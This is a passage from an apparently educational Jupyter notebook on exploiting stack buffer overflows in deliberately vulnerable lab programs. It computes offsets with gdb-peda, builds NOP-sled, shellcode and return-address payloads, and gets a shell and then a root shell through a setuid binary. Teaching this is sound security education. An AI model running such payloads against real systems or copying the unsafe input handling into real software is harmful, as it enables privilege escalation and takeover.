    "- total bytes remaining for NOP sled and repeated return address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "120\n"
     ]
    }
   ],
   "source": [
    "print(144-24)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- out of **120** bytes, return address size is 4 in x86 system\n",
    "- let's repeat the return address 5 times\n",
    "- so the size of repeated return address = 5\\*4 = 20\n",
    "- that leaves us with 120-20 = 100 NOP sled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "100\n"
     ]
    }
   ],
   "source": [
    "print(120-20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- now let's create the payload file...\n",
    "```\n",
    "NOP sled | shellcode | repeated return address\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's create NOP sled of 100 bytes long and write it to payload.bin file\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*100)' > payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append shellcode.bin to payload.bin file\n",
    "! cat shellcode1_py3.bin >> payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- what's the address of buffer?\n",
    "- make sure we use the same size of junk as the size of the payload\n",
    "- this should be run directly from terminal as the buffer will shift if the program is run from the notebook\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ ./stack_overflow_arg.exe $(python3 -c 'print(\"A\"*144, end=\"\")')\n",
    "buffer is at 0xffffc2c0 <----------- this is the buffer address!\n",
    "buffer contains: \n",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
    "Segmentation fault\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ffffc2d4"
     ]
    }
   ],
   "source": [
    "# find 20 bytes away from the base address of the buffer if necessary\n",
    "! printf \"%x\" $((0xffffc2c0+20))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's just use the buffer's base address to start with...\n",
    "# we repeat the return address 5 times\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\xc0\\xc2\\xff\\xff\"*5)' >> payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "144 payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "# out payload is ready; let's check it's size\n",
    "! wc -c payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "00000060  90 90 90 90 31 c0 50 68  2f 2f 73 68 68 2f 62 69  |....1.Ph//shh/bi|\r\n",
      "00000070  6e 89 e3 31 c9 89 ca 6a  0b 58 cd 80 c0 c2 ff ff  |n..1...j.X......|\r\n",
      "00000080  c0 c2 ff ff c0 c2 ff ff  c0 c2 ff ff c0 c2 ff ff  |................|\r\n",
      "00000090\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the content using hexdump\n",
    "! hexdump -C payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### finally, run the target program with the payload \n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ ./stack_overflow_arg.exe $(cat payload.bin)\n",
    "buffer is at 0xffffc2c0\n",
    "buffer contains: \n",
    "����������������������������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j\n",
    "          X��������������������\n",
    "$ whoami\n",
    "kali\n",
    "$ \n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- if the steps demostrated are put into a single bash script, the script is called exploit code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use standard input to transfer the shellcode\n",
    "\n",
    "- if the program takes data from standard input and the buffer overrun is possible, then shellcode can still be transmitted and the program exploited\n",
    "- the steps are slightly different from sending shellcode as an argument\n",
    "- let's work with stack_overflow_stdio.cpp program to demonstrate the steps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow_stdio.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/types.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <iostream>\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void give_shell(){\r\n",
      "    // Set the gid to the effective gid\r\n",
      "    // this prevents /bin/sh from dropping the privileges\r\n",
      "    gid_t gid = getegid();\r\n",
      "    setresgid(gid, gid, gid);\r\n",
      "    system(\"/bin/sh\");\r\n",
      "}\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    int ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t') )\r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (ch = getchar()) {\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    }\r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    printf(\"Enter some data: \");\r\n",
      "    mgets(buffer); // similar to C's gets; depricated\r\n",
      "    //gets(buffer);\r\n",
      "    cout << \"buffer contains: \" << buffer << endl;\r\n",
      "    printf(\"size of buffer = %d and length is %d\\n\", sizeof(buffer), strlen(buffer));\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    gid_t gid = getegid();\r\n",
      "    setresgid(gid, gid, gid);\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_stdio.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh stack_overflow_stdio.cpp stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- since the stack_overflow_stdio.exe program reads the data from standard input, it can be piped to the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2d0\r\n",
      "Enter some data: buffer contains: Hello World\r\n",
      "size of buffer = 128 and length is 11\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"Hello World\")' | ./stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Crash the program\n",
    "\n",
    "- quick way to tell if the program has buffer overrun vulnerability, is to send a long string and see how the program reacts\n",
    "- if the program segfaults, it's a telltail sign that the program has buffer overflow flaw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2d0\n",
      "Enter some data: buffer contains: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
      "size of buffer = 128 and length is 100\n",
      "Good bye!\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*100)' | ./stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- because the size of the buffer is 128 and the data we sent was 100, this was okay as expected"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc2d0\r\n",
      "Enter some data: buffer contains: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "size of buffer = 128 and length is 200\r\n",
      "/bin/bash: line 1: 23291 Done                    python -c 'print(\"A\"*200)'\r\n",
      "     23292 Segmentation fault      | ./stack_overflow_stdio.exe\r\n"
     ]
    }
   ],
   "source": [
    "# try longer string\n",
    "! python -c 'print(\"A\"*200)' | ./stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- so 200 is long enough (perhaps too long) to crash the program\n",
    "- let's find the offset of the caller's return address with respect to the buffer in gdb-peda\n",
    "- use PEDA's cyclic pattern technique as it's much faster than stepping through GDB\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ gdb -q stack_overflow_stdio.exe\n",
    "Reading symbols from stack_overflow_stdio.exe...\n",
    "```\n",
    "\n",
    "- since the program reads the data from standard input, we need to pipe the cyclic pattern from a file\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern create 200 pattern.txt\n",
    "Writing pattern of 200 chars to filename \"pattern.txt\"\n",
    "\n",
    "gdb-peda$ run pattern.txt\n",
    "Starting program: /home/kali/projects/EthicalHacking-Notebooks/stack_overflow_stdio.exe pattern.txt\n",
    "buffer is at 0xffffc2d0\n",
    "Enter some data: ssfa\n",
    "buffer contains: ssfa\n",
    "size of buffer = 128 and length is 4\n",
    "Good bye!\n",
    "[Inferior 1 (process 23362) exited normally]\n",
    "Warning: not running\n",
    "gdb-peda$ run < pattern.txt \n",
    "Starting program: /home/kali/projects/EthicalHacking-Notebooks/stack_overflow_stdio.exe < pattern.txt\n",
    "buffer is at 0xffffc2e0\n",
    "Enter some data: buffer contains: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n",
    "size of buffer = 128 and length is 200\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0x27 (\"'\")\n",
    "EBX: 0x6c414150 ('PAAl')\n",
    "ECX: 0x0 \n",
    "EDX: 0x1 \n",
    "ESI: 0xf7de6000 --> 0x1e4d6c \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffc370 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc370 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffc374 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0008| 0xffffc378 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffc37c (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffc380 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffc384 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffc388 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffc38c (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "\n",
    "```\n",
    "- now let's search for pattern to find the offset\n",
    "\n",
    "```bash\n",
    "gdb-peda$ patts\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 132\n",
    "EBP+0 found at offset: 136\n",
    "EIP+0 found at offset: 140\n",
    "Registers point to pattern buffer:\n",
    "[ESP] --> offset 144 - size ~56   <---------- offset we want!\n",
    "Pattern buffer found at:\n",
    "0x08051bd7 : offset    5 - size  195 ([heap])\n",
    "0x08051fc0 : offset    0 - size  200 ([heap])\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc2e0 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7de6584 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6588 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de658c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6590 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6594 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6598 : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de659c : 0x08051fc0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7e62d3c : 0xffffc2e0 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffc2c0 : 0xffffc2e0 ($sp + -0xb0 [-44 dwords])\n",
    "```\n",
    "- \n",
    "\n",
    "- so, the offset is **144 bytes** to completely overwrite the caller's return address\n",
    "- next, we need to find the base address of buffer \n",
    "- the base address of buffer is conveniently printed"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- create the payload of the form\n",
    "```\n",
    "NOP sled | shellcode | repeated return address\n",
    "```\n",
    "- we need to do some math to figure out howmany NOP sled and repeated return address we need to make the total payload length to be 144 bytes\n",
    "- shellcode size is fixed, let's copy and see the size"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/shellcode.bin ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "120\n"
     ]
    }
   ],
   "source": [
    "# this leaves us with\n",
    "print(144-24)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- since we've 120 bytes, let's use 10 repeated return address just in case"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80\n"
     ]
    }
   ],
   "source": [
    "print(120-40)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- so we can use 80 NOP bytes as sled to slide down to our shellcode\n",
    "- now we have all the numbers we need to create our 144 long payload with shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*80)' > stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat shellcode.bin >> stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "104 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we need to get the buffer's address from the terminal, not from the Jupyter Notebook!\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ python -c 'print(\"A\"*10)' | ./stack_overflow_stdio.exe \n",
    "buffer is at 0xffffc340\n",
    "Enter some data: buffer contains: AAAAAAAAAA\n",
    "size of buffer = 128 and length is 10\n",
    "Good bye!\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x40\\xc3\\xff\\xff\"*10)' >> stdio_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "144 stdio_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- payload is ready and let's send it to the target program from the terminal\n",
    "- we don't get a prompt but an accessible terminal; just write some command such as `whoami`, `ls`, etc.\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ cat stdio_payload.bin - | ./stack_overflow_stdio.exe \n",
    "buffer is at 0xffffc340\n",
    "\n",
    "Enter some data: buffer contains: ��������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j\n",
    "     X@���@���@���@���@���@���@���@���@���@���\n",
    "size of buffer = 128 and length is 144\n",
    "whoami\n",
    "kali\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### root setuid program exploit\n",
    "- let's say the program stack_overflow_stdio.exe was a root setuid program\n",
    "- let's check the current owner of the stack_overflow_stdio.exe program\n",
    "- if the program is compiled using `sudo ./compile.sh`, the owner:group will already be root\n",
    "- next set the setuid bit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 root root 33740 Dec 14 22:52 stack_overflow_stdio.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S chmod +s stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 33740 Dec 14 22:52 stack_overflow_stdio.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al stack_overflow_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- now the program is root setuid, the program will be executed as root when any regular user executes it\n",
    "- if the program is exploited to get shell, the shell will have root priviledge!\n",
    "- let's demonstrate just that...\n",
    "- first, we'll copy the root shellcode and create our payload of the form\n",
    "- we already know the offset of **144 bytes**, but need to do the math again as root shellcode size is longer!\n",
    "```\n",
    "NOP sled | root shellcode | repeated return address\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/shellcode_root.bin ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "35 shellcode_root.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode_root.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "69\n"
     ]
    }
   ],
   "source": [
    "# 40 bytes of repeated return address\n",
    "print(144-35-40)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "# need 69 bytes of NOP sled\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*69)' > stdio_root_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat shellcode_root.bin >> stdio_root_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x40\\xc3\\xff\\xff\"*10)' >> stdio_root_payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "144 stdio_root_payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c stdio_root_payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- let's send the payload to the target program, hit enter to end the std input\n",
    "- you'll not get prompt but an accessible root shell!\n",
    "\n",
    "```\n",
    "(base) kali@kali:~/projects/EthicalHacking-Notebooks$ cat stdio_root_payload.bin - | ./stack_overflow_stdio.exe \n",
    "buffer is at 0xffffc340\n",
    "[enter]\n",
    "Enter some data: buffer contains: ���������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                                XQh//shh/bin��Q��S��@���@���@���@���@���@���@���@���@���@���\n",
    "size of buffer = 128 and length is 144\n",
    "whoami\n",
    "root\n",
    "cd /\n",
    "ls\n",
    "bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz\n",
    "boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old\n",
    "\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
